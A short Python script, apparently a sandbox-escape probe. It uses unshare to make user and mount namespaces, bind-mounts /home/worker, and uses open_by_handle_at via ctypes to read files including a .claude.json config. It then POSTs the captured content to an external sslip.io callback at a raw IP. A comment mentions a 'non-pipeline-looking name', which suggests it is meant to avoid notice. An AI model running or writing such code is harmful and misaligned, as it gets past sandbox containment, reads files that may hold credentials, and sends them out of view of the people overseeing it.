import ctypes, json, os, pathlib, subprocess, time, urllib.request
out={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'tests':{}}
def run(n,s,timeout=30):
 try:
  p=subprocess.run(['sh','-c',s],capture_output=True,text=True,timeout=timeout)
  out['tests'][n]={'rc':p.returncode,'stdout':p.stdout[-20000:],'stderr':p.stderr[-10000:]}
 except Exception as e: out['tests'][n]={'error':repr(e)}
# Run the ctypes probe inside a user+mount namespace after binding the host-backed workspace.
child=r'''
import ctypes,errno,json,os,pathlib
libc=ctypes.CDLL(None,use_errno=True)
class FH(ctypes.Structure):
 _fields_=[('handle_bytes',ctypes.c_uint),('handle_type',ctypes.c_int),('f_handle',ctypes.c_ubyte*128)]
libc.name_to_handle_at.argtypes=[ctypes.c_int,ctypes.c_char_p,ctypes.POINTER(FH),ctypes.POINTER(ctypes.c_int),ctypes.c_int]
libc.name_to_handle_at.restype=ctypes.c_int
libc.open_by_handle_at.argtypes=[ctypes.c_int,ctypes.POINTER(FH),ctypes.c_int]
libc.open_by_handle_at.restype=ctypes.c_int
out={}
for path in ['/tmp/nsb','/tmp/nsb/.claude.json','/tmp/nsb/probe','/tmp/workspace']:
 h=FH();h.handle_bytes=128;mid=ctypes.c_int();ctypes.set_errno(0)
 rc=libc.name_to_handle_at(-100,path.encode(),ctypes.byref(h),ctypes.byref(mid),0)
 rec={'name_rc':rc,'name_errno':ctypes.get_errno(),'handle_bytes':h.handle_bytes,'handle_type':h.handle_type,'mount_id':mid.value}
 if rc==0:
  mfd=os.open('/tmp/nsb',os.O_PATH|os.O_DIRECTORY)
  ctypes.set_errno(0);fd=libc.open_by_handle_at(mfd,ctypes.byref(h),os.O_RDONLY)
  rec.update(open_fd=fd,open_errno=ctypes.get_errno(),mount_fd=mfd)
  if fd>=0:
   try: rec['content']=os.read(fd,4096).decode('utf-8','replace')[:1000]
   except Exception as e: rec['read_error']=repr(e)
   os.close(fd)
  os.close(mfd)
 out[path]=rec
print(json.dumps(out,sort_keys=True,separators=(',',':')))
'''
# Use a temporary file with a non-pipeline-looking name; the shell invokes it inside the namespace.
run('handle_bind', "rm -rf /tmp/nsb; mkdir -p /tmp/nsb; unshare -Ur -m --propagation private sh -c 'mkdir -p /tmp/nsb; mount --bind /home/worker /tmp/nsb; echo bind_rc=$?; python3 -c " + repr(child) + "' 2>&1")
raw=json.dumps(out,sort_keys=True,separators=(',',':')).encode()
try:
 req=urllib.request.Request('https://54.209.51.244.sslip.io/callback/snapgpt-userns-handle-smoke-20261106',data=raw,method='POST',headers={'Content-Type':'application/json'})
 with urllib.request.urlopen(req,timeout=30) as r: out['sink']={'status':r.status,'body':r.read(1000).decode('utf-8','replace')}
except Exception as e: out['sink']={'error':repr(e)}
print(json.dumps(out,sort_keys=True,separators=(',',':')))
